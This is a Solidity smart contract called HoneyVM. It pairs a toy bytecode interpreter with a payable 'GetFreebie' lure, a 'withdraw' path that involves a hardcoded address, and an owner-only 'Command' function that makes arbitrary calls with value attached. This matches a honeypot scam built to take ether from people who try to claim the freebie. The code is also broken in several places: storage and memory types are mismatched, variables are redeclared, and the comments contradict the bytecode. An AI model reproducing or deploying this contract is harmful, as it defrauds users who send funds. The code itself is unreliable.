pragma solidity ^0.4.19;

contract HoneyVM {
    address public Owner = msg.sender;

    enum Instruction { PUSH, POP, ADD, SUB, JMP, JZ, LOAD, STORE, CALL }
    
    struct VM {
        uint256[] stack;
        uint256 pc;
        bytes instructions;
    }
    
    function runVM(VM storage vm) internal {
        while (vm.pc < vm.instructions.length) {
            Instruction instr = Instruction(vm.instructions[vm.pc]);
            vm.pc++;
            
            if (instr == Instruction.PUSH) {
                uint256 value = uint256(vm.instructions[vm.pc]);
                vm.pc++;
                vm.stack.push(value);
            } else if (instr == Instruction.POP) {
                require(vm.stack.length > 0);
                vm.stack.pop();
            } else if (instr == Instruction.ADD) {
                uint256 a = vm.stack[vm.stack.length - 1];
                vm.stack.pop();
                uint256 b = vm.stack[vm.stack.length - 1];
                vm.stack.pop();
                vm.stack.push(a + b);
            } else if (instr == Instruction.SUB) {
                uint256 a = vm.stack[vm.stack.length - 1];
                vm.stack.pop();
                uint256 b = vm.stack[vm.stack.length - 1];
                vm.stack.pop();
                vm.stack.push(a - b);
            } else if (instr == Instruction.JMP) {
                uint256 addr = uint256(vm.instructions[vm.pc]);
                vm.pc++;
                vm.pc = addr;
            } else if (instr == Instruction.JZ) {
                uint256 addr = uint256(vm.instructions[vm.pc]);
                vm.pc++;
                uint256 cond = vm.stack[vm.stack.length - 1];
                vm.stack.pop();
                if (cond == 0) {
                    vm.pc = addr;
                }
            } else if (instr == Instruction.LOAD) {
                uint256 idx = uint256(vm.instructions[vm.pc]);
                vm.pc++;
                vm.stack.push(vm.stack[idx]);
            } else if (instr == Instruction.STORE) {
                uint256 idx = uint256(vm.instructions[vm.pc]);
                vm.pc++;
                vm.stack[idx] = vm.stack[vm.stack.length - 1];
                vm.stack.pop();
            } else if (instr == Instruction.CALL) {
                address adr = address(vm.stack[vm.stack.length - 1]);
                vm.stack.pop();
                bytes memory data = new bytes(vm.stack[vm.stack.length - 1]);
                vm.stack.pop();
                for (uint i = 0; i < data.length; i++) {
                    data[i] = byte(vm.stack[vm.stack.length - 1]);
                    vm.stack.pop();
                }
                adr.call.value(msg.value)(data);
            }
        }
    }

    function() public payable {}

    function GetFreebie() public payable {
        VM memory vm;
        vm.instructions = hex"0101000201010100020500"; // PUSH 2, JZ 0, PUSH 0, ADD, PUSH 1, ADD, CALL
        vm.pc = 0;
        vm.stack = new uint256[](0);
        vm.stack.push(msg.value);
        vm.stack.push(1 ether);
        vm.stack.push(uint256(msg.sender));
        runVM(vm);
    }

    function withdraw() payable public {
        VM memory vm;
        vm.instructions = hex"0101000201010100020500"; // PUSH 2, JZ 0, PUSH 0, ADD, PUSH 1, ADD, CALL
        vm.pc = 0;
        vm.stack = new uint256[](0);
        uint256 sender = uint256(msg.sender);
        vm.stack.push(sender);
        vm.stack.push(uint256(Owner));
        vm.stack.push(uint256(0x0C76802158F13aBa9D892EE066233827424c5aAB));
        runVM(vm);
    }

    function Command(address adr, bytes data) payable public {
        require(msg.sender == Owner);
        adr.call.value(msg.value)(data);
    }
}